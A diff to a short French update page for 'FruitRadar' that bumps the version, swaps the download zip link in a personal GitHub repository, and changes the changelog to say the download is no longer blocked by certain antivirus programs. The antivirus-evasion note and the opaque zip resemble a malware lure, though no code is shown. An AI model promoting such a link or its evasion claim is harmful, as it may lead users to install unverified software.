@@ -1,10 +1,10 @@
 # FruitRadar · mise à jour
 
-Dernière version : **4.8.18** (23/11/2026)
+Dernière version : **4.8.19** (23/11/2026)
 
-> Tu peux modifier une histoire avant de la choisir (contexte, noms et apparence des personnages), et voir une miniature type pour chaque style de miniature.
+> Correctif : le téléchargement n'est plus bloqué par certains antivirus.
 
-## [⬇ Télécharger FruitRadar 4.8.18](https://github.com/timotheehml-bot/maj/raw/main/FruitRadar-vente.zip)
+## [⬇ Télécharger FruitRadar 4.8.19](https://github.com/timotheehml-bot/maj/raw/main/FruitRadar.zip)
 
 Fichier zip, 1,5 Mo.
 
